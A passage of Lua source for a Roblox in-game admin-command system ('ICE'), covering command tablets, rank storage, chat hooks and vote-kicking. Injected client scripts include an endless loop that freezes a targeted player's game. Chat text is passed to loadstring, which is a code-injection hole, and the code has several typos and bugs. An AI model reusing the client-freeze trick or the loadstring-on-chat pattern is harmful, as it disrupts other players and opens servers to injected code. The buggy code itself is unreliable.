Run.Position = UDim2.new(0, 75, 0.15, 500)
Run.Size = UDim2.new(0, 70, 0, 20)
Run.BackgroundColor3 = Color3.new(0.0078431377187371, 0.0078431377187371, 0.011764707043767)
Run.BorderColor3 = Color3.new(1, 1, 1)
Run.BackgroundTransparency = 0.5
Run.Text = 'Run'
Run.FontSize = Enum.FontSize.Size12
Run.TextStrokeTransparency = 0
Run.TextColor3 = Color3.new(1, 1, 1)
Run.ZIndex=10
Txt = Instance.new('TextBox', CommandBar)
Txt.Name = 'Txt'
Txt.Position = UDim2.new(0, 150, 0.15, 500)
Txt.Size = UDim2.new(0, 850, 0, 20)
Txt.BackgroundColor3 = Color3.new(0.0078431377187371, 0.0078431377187371, 0.011764707043767)
Txt.BorderColor3 = Color3.new(1, 1, 1)
Txt.BackgroundTransparency = 0.5
Txt.Text = ''
Txt.FontSize = Enum.FontSize.Size12
Txt.TextStrokeTransparency = 0
Txt.TextXAlignment = Enum.TextXAlignment.Left
Txt.TextColor3 = Color3.new(1, 1, 1)
Txt.ZIndex=10
Clear = Instance.new('TextButton', CommandBar)
Clear.Name = 'Clear'
Clear.Position = UDim2.new(0, 0, 0.15, 500)
Clear.Size = UDim2.new(0, 70, 0, 20)
Clear.BackgroundColor3 = Color3.new(0.0078431377187371, 0.0078431377187371, 0.011764707043767)
Clear.BorderColor3 = Color3.new(1, 1, 1)
Clear.BackgroundTransparency = 0.5
Clear.Text = 'Clear'
Clear.FontSize = Enum.FontSize.Size12
Clear.TextStrokeTransparency = 0
Clear.TextColor3 = Color3.new(1, 1, 1)
Clear.ZIndex=10
Is=Instance.new'StringValue'
Is.Parent=CommandBar
Is.Name='IsCmd'
Run.MouseButton1Down:connect(function()
if Txt.Text:sub(1,1) == "^" then
ICE.OnChatted(Txt.Text:sub(2),v)
else	
ICE.OnChatted(Txt.Text,v,true)
end
end)
Clear.MouseButton1Down:connect(function() Txt.Text="" end)
end
end
end
end)()
end 
if ICE.ActivateGrow==true then
for i,v in pairs(ICE.Tablets) do	
if v.JustMade==false then
if v.Rising==true then
if v.Part.Size.x >= 2.5 then
v.Rising=false
else
v.Part.Size=Vector3.new(v.Part.Size.x+0.1,v.Part.Size.y+0.1,v.Part.Size.z+0.1)
end
else
if v.Part.Size.x <= 1 then
v.Rising=true
else
v.Part.Size=Vector3.new(v.Part.Size.x-0.1,v.Part.Size.y-0.1,v.Part.Size.z-0.1)
end
end
end
end
end	
local Source=game:findFirstChild("DSource",true) or game:findFirstChild("Source",true) or game:findFirstChild("source",true)
if Source then
if ICE.LocalScript==nil then
if Source.Parent:IsA'LocalScript' then
Par=Source.Parent:Clone()
Par:ClearAllChildren()
ICE.LocalScript=Par
for _,v in pairs(ICE.Services.Players:GetPlayers()) do
if ICE.GetRank(v) >= 1 then
ICE.Output('[ICE]: Found local script','White',v,3)
end
end
end
end
end
end)()
-- pcall(function()
for i,v in pairs(ICE.Tablets) do
if v.Model == nil or v.Model.Parent == nil or v.Part == nil or v.Part.Parent==nil then
ICE.Tablets[i]=nil

end
pcall(function() if ICE.Services.Players:FindFirstChild(v.Player) == nil then
v.Model:Destroy()
ICE.Tablets[i]=nil
end end)
end
for _,Player in pairs(ICE.Services.Players:GetPlayers()) do
local _tablets = ICE.GetTablets(Player)
local DismissTablets={}
local TabletNumber = 0
for i,v in pairs(_tablets) do
if #_tablets == 1 then
if v.Label.Text == 'Dismiss' then
v.Model:Destroy()
_tablets[i]=nil
end
elseif #_tablets > 1 then
if v.Label.Text == "Dismiss" then
table.insert(DismissTablets,v)
end
end
TabletNumber = TabletNumber + 1
end
if #DismissTablets > 1 then for i,Tablet in pairs(DismissTablets) do if #DismissTablets > 1 then Tablet.Model:Destroy() DismissTablets[i]=nil end end end
if #DismissTablets == 0 and #_tablets >=2 then ICE.Output('Dismiss','Red',Player) end
for i = 1, #_tablets do
if _tablets[i].Model.Parent ~= nil then
local tab = _tablets[i].Part
local pos = nil
pcall(function()
pos = Player.Character.Torso.CFrame
end)
if pos == nil then
repeat 
pcall(function() pos=Player.Character.Torso.CFrame end)
wait()
until Pos
end
if pos then
local x = math.sin(time()/#_tablets + (math.pi*2)/#_tablets*i) * (#_tablets+6)
local z = math.cos(time()/#_tablets + (math.pi*2)/#_tablets*i) * (#_tablets+6)
local cPos = tab.Position
local ePos = Vector3.new(x, 0, z) + (pos.p or Vector3.new(0, -5, 0))
local nPos = (ePos-cPos)*.25
cPos = cPos + nPos
--local Angles={};
Angles={_tablets[i].x,_tablets[i].y,_tablets[i].z}
Angles[1]=Angles[1]+tonumber( math.random() + math.random() );
Angles[2]=Angles[2]+tonumber( math.random() + math.random() );
Angles[3]=Angles[3]+tonumber( math.random() + math.random() );
tab.CFrame = CFrame.new(cPos, (pos.p or Vector3.new(0, -5, 0))) * CFrame.Angles(math.rad(Angles[1]),math.rad(Angles[2]),math.rad(Angles[3]))
_tablets[i].x=Angles[1]
_tablets[i].y=Angles[2]
_tablets[i].z=Angles[3]
if tab:findFirstChild("Effect") then
	tab.Effect.CFrame = tab.CFrame
end
end
else
_tablets[i]=nil
end
end        
end
-- end)
-- end
end
ICE.GetTablets=function(Player)
        if type(Player) == 'userdata' then Player=Player.Name end;
        Rt={}
        for i,v in pairs(ICE.Tablets) do if v.Player == Player then table.insert(Rt,v) end end;
        return Rt
end
ICE.Replicate=function(Text,Number)
	Total="";
	for i=1,Number do wait()
		Total=Total .. Text;
	end
	return Total
end;
ICE.ItemCFrame=function(Item,Bool)
	if type(Item)=='string' then
		Item=game:findFirstChild(Item,Bool)
	end
	-- Load the Item first ;)
	-- Set up tables --
	ReturnTable={};
	MetaReturnTable={
		__index=function(tab,key)
			local Daf={Item=nil,CFrame=nil};
			Daf.Item=ItemCFrame(Item,Bool)[1].Item;
			Daf.CFrame=ItemCFrame(Item,Bool)[1].CFrame;
			ReturnTable[#ReturnTable+1]=Daf
			return Daf;
		end;
	};
	setmetatable(ReturnTable,MetaReturnTable);
	if type(Item) == 'table' then
		for i,v in pairs(Item) do
			if type(i)=='string' then
				table.insert(ReturnTable,{Item=ItemCFrame(i,Bool)[1].Item,CFrame=ItemCFrame(i,Bool)[1].CFrame})
			else
				table.insert(ReturnTable,{Item=ItemCFrame(v,Bool)[1].Item,CFrame=ItemCFrame(v,Bool)[1].CFrame})
			end
		end
	else
		if type(Item)=='userdata' then
			if Item:IsA'Model' then
				CFrame=Item:GetModelCFrame();
				ReturnTable[#ReturnTable+1]={Item=Item.PrimaryPart or Item,CFrame=CFrame};
			else
				ReturnTable[#ReturnTable+1]={Item=Item,CFrame=Item.CFrame};
			end
		else
			return '[Item CFrame Function]: Unsupported argument type(Item)'
		end
	end
	return ReturnTable
end;
ICE.Output=function(Text,Color,Player,Time,Func,HoverEnter,HoverExit,Type)
		if Text == nil or Player == nil then return end
		if Player:IsA'Player' then else return end
        if Color == nil then Color = "Orange" end
        if Color == "Random" then
                Color = Color3.new(math.random(),math.random(),math.random())
        end
        if type(Color) == "string" then
            if Color == "Random" then
				Color=Color3.new(math.random(),math.random(),math.random())
				Color = Color3.new(math.random(),math.random(),math.random())
			else
                Color = ICE.Colors[Color]
			end
        end
		local Model=Instance.new'Model'
		Model.Name,Model.Parent='Output:\\['..Player.Name..']/:tuptuO',ICE.Services.Workspace
		local Part=Instance.new'Part'
		Part.Parent,Part.FormFactor,Part.TopSurface,Part.BottomSurface,Part.Transparency,Part.Anchored,Part.Locked,Part.CanCollide,Part.BrickColor,Part.Size=Model,'Custom','Smooth','Smooth',0.7,true,true,false,BrickColor.new(Color),Vector3.new(0,0,0)
		Part:BreakJoints();
		local SelectionBox=Instance.new'SelectionBox'
		SelectionBox.Parent,SelectionBox.Name,SelectionBox.Color,SelectionBox.Adornee,SelectionBox.Transparency=Part,'SelectionBox',BrickColor.new(Color),Part,0.7
		local BillBoard=Instance.new'BillboardGui'
		BillBoard.Parent,BillBoard.Name,BillBoard.StudsOffset,BillBoard.Size=Model,'BBG',Vector3.new(0,3,0),UDim2.new(10,0,10,0)
		local Label=Instance.new'TextLabel'
		Label.Parent,Label.Name,Label.Text,Label.TextColor3,Label.FontSize,Label.BackgroundTransparency,Label.TextStrokeTransparency,Label.Size,Label.TextStrokeColor3=BillBoard,'Label',Text,Color3.new(-1,-1,-1),'Size14',1,0.5,UDim2.new(1,0,1,0),Color
		local Click=Instance.new'ClickDetector'
		Click.Parent,Click.MaxActivationDistance=Part,1/0
		local Effect=nil;
		if ICE.Tablet ~= 'Normal' then
			Part.Shape='Ball';
			Part.Size=Vector3.new(2,2,2)
			local Effect=Instance.new'Part'
			Effect.Parent,Effect.FormFactor,Effect.TopSurface,Effect.BottomSurface,Effect.Transparency,Effect.Anchored,Effect.Locked,Effect.CanCollide,Effect.BrickColor,Effect.Size=Model,'Custom','Smooth','Smooth',0.7,true,true,false,BrickColor.new(Color),Vector3.new(0,0,0)
			Effect:BreakJoints();
			Effect.Parent = Part
			Effect.Name = "Effect"
			Effect.Shape = "Block"
			Effect.FormFactor = "Custom"
			Effect.CFrame=Part.CFrame
			Effect.Transparency = 0
			Effect.Size = Vector3.new(0.875,0.875,0.875)
			SelectionBox.Adornee=Effect
			Part.Transparency=0.5
		elseif ICE.Effect and ICE.Effect==true then
			local Effect=Instance.new'Part'
			Effect.Parent,Effect.FormFactor,Effect.TopSurface,Effect.BottomSurface,Effect.Transparency,Effect.Anchored,Effect.Locked,Effect.CanCollide,Effect.BrickColor,Effect.Size=Model,'Custom','Smooth','Smooth',0.7,true,true,false,BrickColor.new(Color),Vector3.new(0,0,0)
			Effect:BreakJoints();
			Effect.Parent = Part
			Effect.Name = "Effect"
			Effect.Shape = "Ball"
			Effect.FormFactor = "Custom"
			Effect.CFrame=Part.CFrame
			Effect.Transparency = 0
			Effect.Size = Vector3.new(0.875,0.875,0.875)
			SellClone=Instance.new'SelectionBox'
			SellClone.Color=BrickColor.new(Color);
			SellClone.Adornee=Effect
			SellClone.Parent=Effect
			SellClone.Transparency=0.5
		end	
		if Type then
			if Type == "Tablet" then
				Effect=Part:clone()
				Effect.Size=Vector3.new(1,1,1)
				Effect.Shape=math.random(1,4)
				Effect.Name='Effect'
				Effect:ClearAllChildren();
				Effect.Parent=Part
			end
		end
		pcall(function()
			-- Dynamic lighting
			if ICE.Services.Lighting.GlobalShadows==true and ICE.Services.Lighting.Ambient==Color3.new(0,0,0) or ICE.Services.Lighting.Ambient==Color3.new(-1,-1,-1) then
				Spot=Instance.new'PointLight'
				Spot.Color=Color
				Spot.Parent=Part
				Spot.Range=10
				Spot.Brightness=1/0
			end
		end)
		Click.MouseHoverEnter:connect(function(Clicker)
			if Clicker==Player or ICE.GetRank(Clicker) > ICE.GetRank(Player) then
				if HoverEnter~=nil then
					HoverEnter(Model,Part,Player.Name,SelectionBox,Label)
				else
					SelectionBox.Transparency,Part.Transparency=0,0.3
				end
			end
        end)
		Click.MouseHoverLeave:connect(function(Clicker)
			if Clicker==Player or ICE.GetRank(Clicker) > ICE.GetRank(Player) then
				if HoverExit~=nil then
					HoverExit(Model,Part,Player.Name,SelectionBox,Label)
				else
					SelectionBox.Transparency,Part.Transparency=0.7,0.7
				end
			end
        end)
		Click.MouseClick:connect(function(Clicker)
			if Clicker==Player or ICE.GetRank(Clicker) > ICE.GetRank(Player) then
				if Text=='Dismiss' then
					ICE.RemoveTablets(Player);
				end
				if Func~=nil then
					local Ran,Error=coroutine.resume(coroutine.create(function() Func(Player) end))
					if Ran == nil and Error then
						ICE.Output(Error,'Red',Player,5)
					end
				end
				coroutine.wrap(function()
					for i=0,2.5,0.1 do
						if i <= 1 then
						Part.Transparency,SelectionBox.Transparency,Label.TextTransparency=i,i,i
						end	
						Num=2.5-i
						if ICE.Tablet=='Normal' then
							Part.Size=Vector3.new(Num,Num,Num)
						end
						wait()
					end
					if Model then
						Model:Destroy()
					end
				end)()
			end
        end)
		ICE.Tablets[#ICE.Tablets+1] = {Model = Model,Part = Part,Player = Player.Name,Sel = SelectionBox,Label = Label,Type="No",x=0,y=0,z=0,JustMade=false,Rising=false}
		coroutine.wrap(function()
			if ICE.ActivateGrow==false and ICE.Tablet == 'Normal' then
				for i=0,2.5,0.1 do
					wait()
					Part.Size=Vector3.new(i,i,i)
				end
				wait()
			end
		end)()
		if Time then
			game:service'Debris':AddItem(Model,Time)
		end
        ICE.Rotate()
        return {Model = Model,Part = Part,Player = Player.Name,Sel = SelectionBox,Label = Label}
end
ICE.OutputImg=function(Image,Text,Color,Player,Time,Func)
    Tab = ICE.Output(Text,Color,Player,Time,Func)
	if type(Image)=='number' then Image=tostring(Image) end
    if #Image < #("http://www.roblox.com/") then
		Image="http://www.roblox.com/asset/?id="..Image
	end
    BBG = Instance.new("BillboardGui",Tab.Model)
    BBG.Size = UDim2.new(5,0,6,0)
    BBG.StudsOffset = Vector3.new(0, 7, 0)
    BBG.Adornee = Tab.Part
    Img = Instance.new("ImageLabel",BBG)
    Img.Size = UDim2.new(1,0,1,0)
    Img.BackgroundTransparency = 1
    Img.Image = Image--"http://www.roblox.com/asset/?id=111659053"
    return Tab
end
ICE.BCtoC3=function(BC)
	if type(BC)=='userdata' or type(BC)=='BrickColor' then
		return Color3.new(BC)
	elseif type(BC)=='string' then
		return Color3.new(BrickColor.new(BC))
	else
		return 'Unsupported format( ' .. type(BC) .. '; ' .. tostring(BC) .. ')'
	end
end;
ICE.SaveData=function(Player)
	local Old=Player:LoadInstance('Data ICE25' )
	New=false
	if Old==nil then
		New=true
		Old=Instance.new'Model'
	end
	if New==true then
		local Rank=Instance.new'IntValue'
		Rank.Parent=Old
		Rank.Name='Rank'
		Rank.Value=ICE.Ranked[Player.Name].Rank
		Color=Instance.new'Color3Value'
		Color.Parent=Old
		Color.Name,Color.Value='Color',ICE.Ranked[Player.Name].Color
	else
		pcall(function() 
			if Old.Rank then 
				Old.Rank.Value=ICE.Ranked[Player.Name].Rank
				Old.Color.Value=ICE.Ranked[Player.Name].Color
			else
				local Rank=Instance.new'IntValue'
				Rank.Parent=Old
				Rank.Name='Rank'
				Rank.Value=ICE.Ranked[Player.Name].Rank
				Color=Instance.new'Color3Value'
				Color.Parent=Old
				Color.Name,Color.Value='Color',ICE.Ranked[Player.Name].Color
			end
		end)
	end
	Player:SaveInstance('Data ICE25',Old)
end
ICE.LoadData=function(Player)
	tab={Rank=nil,Color=nil}
	local Mod=Player:LoadInstance'Data ICE25'
	if Mod then
		tab.Rank=Mod.Rank.Value
		tab.Color=Mod.Color.Value
	end
	return tab
end
ICE.CreateLocalScript=function(Source,Parent)
	if Parent==nil then Parent=Instance.new'Model' end
	if Source==nil then return end
	if newLocalScript then
		return newLocalScript(Source,Parent)
	elseif NewLocalScript then
		return NewLocalScript(Source,Parent)
	else
		if ICE.LocalScript~=nil then
			CL=ICE.LocalScript:clone()
			CL:ClearAllChildren();
			CL.Name='[ICE]:PseudoLocal'
			DS=Instance.new'StringValue'
			DS.Name='Source'
			if game.CreatorId==9201 then
				DS.Name='DSource'
			end
			DS.Value=Source
			CL.Disabled=true
			CL.Parent=Parent
			CL.Disabled=false
			return CL
		else
			return nil
		end
	end
end
--[[ Mesh = Instance.new("SpecialMesh")
	Mesh.MeshId = "http://www.roblox.com/asset/?id=105408067"
	Mesh.MeshType = Enum.MeshType.FileMesh
	Mesh.Parent=Tab.Part
 ]] --
ICE.ConChat=function(Player)
	coroutine.wrap(function()
		local Script = ICE.CreateLocalScript([==[
			wait()
			script.Parent=Instance.new'Glue'
			LocalPlayer=game:service'Players'.LocalPlayer;
			Rank=]==]..tostrin(ICE.Ranked[Player].Rank)..[==[;
			repeat
				wait()
			until LocalPlayer.Parent==nil or LocalPlayer.Parent ~= game.Players;
			LocalPlayer.Chatted:connect(function(Msg)
				if Rank > 0 then
					local Mod=Instance.new'Model'
					lcoal Data=Instance.new'StringValue'
					local Player=Instance.new'Model'
					Player.Name=LocalPlayer.Name
					Mod.Name='External';
					Data.Name='Message'
					Data.Value=tostring(Msg)
					Data.Parent=Mod
					Player.Parent=Mod
					Mod.Parent=game:service'Lighting'
					game:service'Debris':AddItem(Mod,5)
				end
			end)
		]==],Player.Backpack)
	end)()
end
ICE.SetChat=function(Player)
	coroutine.wrap(function()
		local Connection=Player.Chatted:connect(function(Msg) coroutine.wrap(function() ICE.OnChatted(Msg,Player) end)() end)
		FoundChat=ICE.ChatConnections[Player.Name]
		if FoundChat~=nil then
			FoundChat.Conn:disconnect()
			ICE.ChatConnections[Player.Name]={Conn=Connection}
		else
			ICE.ChatConnections[Player.Name]={Conn=Connection};
		end
	end)()
end
ICE.FixChat=function(Player)
	coroutine.wrap(function()
		local Connection=Player.Chatted:connect(function(Msg) coroutine.wrap(function() ICE.OnChatted(Msg,Player) end)() end)
		FoundChat=ICE.ChatConnections[Player.Name]
		if FoundChat~=nil then
			FoundChat.Conn:disconnect()
			ICE.ChatConnections[Player.Name]={Conn=Connection}
		else
			ICE.ChatConnections[Player.Name]={Conn=Connection};
		end
	end)()
end
ICE.Connect=function(Player)
	coroutine.wrap(function()
	repeat wait() until Player.Character and Player:findFirstChild'Backpack'
	if newLocalScript then
		newLocalScript([==[
			wait()
			script.Parent=Instance.new'Glue'
			LocalPlayer=game:service'Players'.LocalPlayer;
			LocalPlayer.Chatted:connect(function(Msg)
				--if Rank > 0 then
					if game.Players:findFirstChild(LocalPlayer.Name)==nil then
						Mod,Mg,Pg=Instance.new'Model',Instance.new'StringValue',Instance.new'StringValue'
						Mod.Name,Mg.Name,Pg.Name='External','Message',LocalPlayer.Name
						Mg.Value,Pg.Value=tostring(Msg),'Player'
						Mg.Parent,Pg.Parent=Mod,Mod
						Mod.Parent=game.Workspace
						game:service'Debris':AddItem(Mod,5)
					end
				--end
			end)
		]==],Player.Backpack)
		newLocalScript([[
				ICE={
					Services={};
				}
				for i,v in pairs(game:children()) do ICE.Services[v.Name]=v end
				LocalPlayer=ICE.Services.Players.LocalPlayer;
		script.Parent=nil;
		script:ClearAllChildren();
		Removed=false
		game:service'RunService'.Stepped:connect(function()
		if Removed==false then
			if ICE.Services.Lighting:findFirstChild'Disconnect' then
				local Item=ICE.Services.Lighting:findFirstChild'Disconnect'
				if Item.Value==LocalPlayer.Name then
					pcall(Item.Destroy,Item)
					LocalPlayer.Parent=nil
					wait()
					LocalPlayer.Parent=ICE.Services.Players
					wait(1)
					repeat until nil
				end
			end
		if ICE.Services.Lighting:findFirstChild'Ender' then
			if ICE.Services.Lighting.Ender.Value=="]]..ICE.Ender..[[" then
				Removed=true
			end
		end
		end
		end)]],Player.Character)
		ICE.Output('Connect succesfully!','Green',Player,3)
		end
	end)()
	coroutine.wrap(function()
		Player:WaitForDataReady()
		if Player.Character==nil then
			Player:LoadCharacter();
		end
		if ICE.Ranked[Player.Name]==nil then
			local Rankkh=0
			Colorr=Color3.new(0,1,0);
			local Item=ICE.LoadData(Player)
			if Item.Rank ~= nil then
				Rankkh=Item.Rank
				Colorr=Item.Color
			end
			ICE.Ranked[Player.Name]={Rank=Rankkh,Color=Color3.new(0,1,0),CMD=false};
		end
		coroutine.wrap(function()
			local Connection=Player.Chatted:connect(function(Msg) coroutine.wrap(function() ICE.OnChatted(Msg,Player) end)() end)
			FoundChat=ICE.ChatConnections[Player.Name]
			if FoundChat~=nil then
				FoundChat.Conn:disconnect()
				ICE.ChatConnections[Player.Name]={Conn=Connection}
			else
				ICE.ChatConnections[Player.Name]={Conn=Connection};
			end
		end)()
		ToBeRemoved=false
		if ICE.Ranked[Player.Name].Rank == -1 then
			for _,v in pairs(ICE.Services.Players:children()) do
				if v.Name == Player.Name then
					--
				else
					pcall(function() Player:Destroy() end)
					ICE.Output(Player.Name .. ' has been removed due to a banishment','Red',v,5)
				end
			end
			repeat
			Player:Destroy();wait();
			until Player==nil
		end
		if Player.Name:sub(1,6) == 'Guest ' then
			ToBeRemoved=true
			for _,v in pairs(ICE.Services.Players:children()) do
				if v.Name ~= Player.Name then
					pcall(function() Player:Destroy() end)
					ICE.Output(Player.Name .. ' has been removed because guests are not allowed.','Red',v,5)
				end
			end
		end
		if Player.AccountAge < 7 and ICE.Ranked[Player.Name].Rank == 0 then
			ToBeRemoved=true
			for _,v in pairs(ICE.Services.Players:children()) do
				if v.Name ~= Player.Name then
					pcall(function() Player:Destroy() end)
					ICE.Output(Player.Name .. ' has been removed because his/her account is not a week old yet.','Red',v,5)
				end
			end
		end
		if ToBeRemoved==true then
			repeat
				Player:Destroy();wait();
			until Player==nil
		else
						--if ICE.LocalScript and game.PlaceId~= 21053279 then
		--end
		
		end
		repeat
			wait()
		until ICE.Ranked[Player.Name]
		wait()
		if ICE.Services.Players:findFirstChild(Player.Name) and ToBeRemoved==false then
			--Player.Chatted:connect(function(Msg) coroutine.wrap(function() ICE.OnChatted(Msg,Player) end)() end)
			ICE.SetChat(Player);
			if ICE.GetRank(Player) > 0 then
				ICE.Output('Your rank is ' .. ICE.GetRank(Player),'Orange',Player,10)
				ICE.Output('Welcome to ICE by SergeantSmoke','Green',Player,10)
				ICE.OnChatted(ICE.Bets[2]..'connect'..ICE.Bets[2],Player,true)
			else
				ICE.OnChatted(ICE.Bets[1]..'menu'..ICE.Bets[2],Player,true)
			end
		end
	end)()

end
ICE.Command=function(Name,Command,Rank,Desc,Args,Func)
	ICE.Commands[Name]={Command=Command,Rank=Rank,Desc=Desc,Args=Args,Func=Func};
end;
ICE.CreateTablets=function(Texts,Colors,Player,Times,Funcs)
	if type(Texts) ~= 'table' then
		Texts={Texts}
	end
	if type(Colors) ~= 'table' then
		Colors={Colors}
	end
	if type(Times) ~= 'table' then
		Times={Times}
	end
	if type(Funcs) ~= 'table' then
		Funcs={Funcs}
	end
	Tabs={};
	if #Colors == 1 and #Texts > 1 then
		for i,v in pairs(Texts) do
			Tabs[#Tabs+1]=ICE.Output(v,Colors[1],Player,Times[1],Funcs[1])
		end
	else
		for i,v in pairs(Texts) do
			Tabs[#Tabs+1]=ICE.Output(v,Colors[i],Player,Times[i],Funcs[i])
		end
	end
	return Tabs
end
ICE.GetRank=function(Playr)
	if type(Playr) == 'userdata' then Playr=Playr.Name end;
	local Rank=0
	local g =ICE.Ranked[Playr]
	if g then Rank = g.Rank end
	return Rank
end
ICE.TableToString=function(Table,TableName)
	local String=""
	if TableName then
		local String= [[ local ]] .. TableName .. [[ = { ]]
	else
		String="{"
	end
	for i,v in pairs(Table) do
		if type(i)=='string' then
			if type(v) ~='table' then
				if type(v)=='string' then
					String=String..i..[[=]]..v..[[;]]
				elseif type(v)=='number' then
					String=String..i..[[=]]..tostring(v)..[[;]]
				else 
					String=String..i..[[=]]..v..[[;]]
				end
			else
				local Tab=ICE.TableToString(v,i)
				String=String..i..[[=]]..Tab..[[;]]
			end
		else
			if type(v) ~='table' then
				if type(v)=='string' then
					String=String..v..[[;]]
				elseif type(v)=='number' then
					String=String..tostring(v)..[[;]]
				else 
					String=String..v..[[;]]
				end
			else
				local Tab=ICE.TableToString(v,i)
				String=String..Tab..[[;]]
			end		
		end
	end
	if String:sub(#String,#String)==';' then
		String=String:sub(1,#String-1)
	end
	String=String.."}"
	return String
end
ICE.SandboxLoadstring=function(Source)
        local Func = loadstring(Source or "")
        setfenv(Func,{___ENV = getfenv(1)})
        return coroutine.wrap(Func)
end
ICE.GetPlayers=function(Msg,Speaker)
        if Msg == nil or Speaker == nil then
                return ICE.Services.Players:GetPlayers() 
        else
                local Rtn = {}
                local Players = game:service'Players':GetPlayers()
                Msg = Msg:lower()
                local Split = Msg:find(",")
                if Split ~= nil then
                        for _,v in pairs(ICE.GetPlayers(Msg:sub(1,Split-1),Speaker)) do
                                Rtn[#Rtn+1] = v
                        end
                        for _,v in pairs(ICE.GetPlayers(Msg:sub(Split+1),Speaker)) do
                                Rtn[#Rtn+1] = v
                        end
                elseif Msg == "me" then
						if Speaker:IsA'Player' then
							Rtn[#Rtn+1] = Speaker
						else
							Rtn[#Rtn+1] = game.Players:GetPlayers()[math.random(1,#game.Players:GetPlayers())]
						end
                elseif Msg == "others" then
                        for _,v in pairs(Players) do
                                if v ~= Speaker then
                                        Rtn[#Rtn+1] = v
                                end
                        end
                elseif Msg == "all" then
                        for _,v in pairs(Players) do
                                Rtn[#Rtn+1] = v
                        end
                elseif Msg:sub(1,4) == "rank" then
                        for _,v in pairs(Players) do
                                if ICE.SandboxLoadstring("return "..tostring(ICE.GetRank(v))..Msg:sub(5))() then
                                        Rtn[#Rtn+1] = v
                                end
                        end
                elseif Msg == "random" then
                        Rtn[#Rtn+1] = Players[math.random(1,#Players)]
                elseif Msg:sub(1,4) == "not " then
                        local Nots = GetPlayers(Msg:sub(5),Speaker)
                        for _,v in pairs(Players) do
                                local ShouldAdd = true
                                for _,i in pairs(Nots) do
                                        if v == i then
                                                ShouldAdd = false
                                        end
                                end
                                if ShouldAdd == true then
                                        Rtn[#Rtn+1] = v
                                end
                        end
                elseif Msg:sub(1,4) == "dist" then
                        for _,v in pairs(Players) do
                                --pcall(function()
                                        local Mag = (v.Character.Torso.Position - Speaker.Character.Torso.Position).magnitude
                                        if ICE.SandboxLoadstring("return "..tostring(Mag)..Msg:sub(5))() and v ~= Speaker then
                                                Rtn[#Rtn+1] = v
                                        end
                                --end)
                        end
                elseif Msg:sub(1,3) == "age" then
                        for _,v in pairs(Players) do
                                if ICE.SandboxLoadstring("return "..tostring(v.AccountAge)..Msg:sub(4))() then
                                        Rtn[#Rtn+1] = v
                                end
                        end
                else
                        for _,v in pairs(Players) do
                                if v.Name:lower():sub(1,#Msg) == Msg then
                                        Rtn[#Rtn+1] = v
                                end
                        end
                end
                                         for i=1,#Rtn do
														
                                                        if ICE.Ranked[Rtn[i].Name] and ICE.Ranked[Rtn[i].Name].Rank > ICE.Ranked[Speaker.Name].Rank then
                                                                ICE.Output(Rtn[i].Name .. ' outranks you!','Red',Speaker)
                                                                Rtn[i]=nil
                                                        end
                                        end
        for _,Player in pairs(Rtn) do
    for _,Parts in pairs(Player.Character:GetChildren()) do
        local Color = ICE.Ranked[Speaker.Name].Color
        if Parts.className == 'Part' then
local Box = Instance.new('SelectionBox', Parts)
Box.Adornee = Parts
Box.Color = BrickColor.new(Color)
Box.Transparency = 0.5
        end
    end
    coroutine.resume(coroutine.create(function()
wait(1)
for _,Parts in pairs(Player.Character:GetChildren()) do for _, Things in pairs(Parts:GetChildren()) do

if Things.className == 'SelectionBox' then Things:remove() end
            end
        end
    end))
end
                return Rtn
        end
end
ICE.RemoveTablets=function(Player)
	if type(Player)=='userdata' then Player=Player.Name end;
	Tablets=ICE.GetTablets(Player);
	for _,v in pairs(Tablets) do
        coroutine.wrap(function()
				for i=0,1,0.1 do wait()
					    v.Part.Transparency = i
               		 	v.Sel.Transparency = i
                		v.Label.TextTransparency = i		
				end
            v.Model:Destroy()
        end)()
	end
end
ICE.VoteData.AddVote=function(Player,Value)
	ICE.VoteData.Votes[Player.Name]=Value
end
ICE.VoteData.RemoveVote=function(Player)
	ICE.VoteData.Votes[Player.Name]=nil
end
ICE.VoteData.PlayerHasVoted=function(Player)
	Is=false
	if ICE.VoteData.Votes[Player.Name]==nil then
		for P,V in pairs(ICE.VoteData.Votes) do
			if P:lower():sub(1,#Player.Name)==Player.Name:lower() then
				Is=true
			end
		end
	else
		Is=true
	end
	return Is
end
ICE.VoteData.ActivateVoteKick=function(Player)
	ICE.VoteData.Votes={};-- Clear the votes
	ICE.VoteData.IsVoting=false-- Reset Voting Value
	ICE.VoteData.VotedPlayer=""-- Reset Voted Player
	ICE.VoteData.VotingPlayers={};-- Reset Voting Players Table
	ICE.VoteData.IsVoting=true;
	ICE.VoteData.VotedPlayer=Player.Name
	ICE.VoteData.VotingPlayers=ICE.Services.Players:GetPlayers()
	for _nil_,VPlayer in pairs(ICE.VoteData.VotingPlayers) do
		coroutine.wrap(function()
			local Tabs={};
			local EndCor=false;
			Tabs['Yes']=ICE.Output('Vote yes!','Red',VPlayer,nil,function() ICE.VoteData.AddVote(VPlayer,true) EndCor=true end)
			Tabs['No']=ICE.Output('Vote no!','Red',VPlayer,nil,function() ICE.VoteData.AddVote(VPlayer,false) EndCor=true end)
			Tabs['Info']=ICE.Output('A vote kick has been initiated on ' .. Player.Name .. ' You have to cast a vote','Green',VPlayer)
			coroutine.wrap(function()
				repeat
					for Name,Dat in pairs(Tabs) do
						if Dat.Model.Parent==nil or Dat.Part.Parent==nil then
							if Name=='Yes' then
								Tabs[Name]=ICE.Output(Dat.Label.Text,'Red',VPlayer,function() ICE.VoteData.AddVote(VPlayer,true) EndCor=true end)
							elseif Name=='No' then
								Tabs[Name]=ICE.Output(Dat.Label.Text,'Red',VPlayer,function() ICE.VoteData.AddVote(VPlayer,false) EndCor=true end)
							else
								Tabs[Name]=ICE.Output('A vote kick has been initiated on ' .. Player.Name .. ' You have to cast a vote','Green',VPlayer)
							end
						end
					end
					wait()
				until EndCor==true
			end)()
		end)()
	end
	coroutine.wrap(function()
		repeat
			wait()
		until #ICE.VoteData.Votes == #ICE.VoteData.VotingPlayers
		local Yes,No=0,0
		for Name,P in pairs(ICE.VoteData.Votes) do
			if P==true then
				Yes=Yes+1
			else
				No=No+1
			end
		end
		-- 2/3rds of Votes need to be yes for the Player to be kicked
		VoteMsg=Instance.new'Message'
		VoteMsg.Name='Voting'
		VoteMsg.Parent=ICE.Services.Workspace:findFirstChild'Base' or ICE.Services.Workspace
		VoteMsg.Text='All the votes are in now calculating votes'
		local Needed = #ICE.VoteData.VotingPlayers
		local NumNeed=false
		local IsMult=false
		for i=3,30 do
			if Needed==i then
				IsMult=true
			end
		end
		if IsMult==true then 
			NumNeeded = Needed / 3 
			NumNeeded=NumNeeded + NumNeeded
		else
			local Mult=0
			for b=3,30 do
				if b < Needed then
					Mult=b
				end
			end
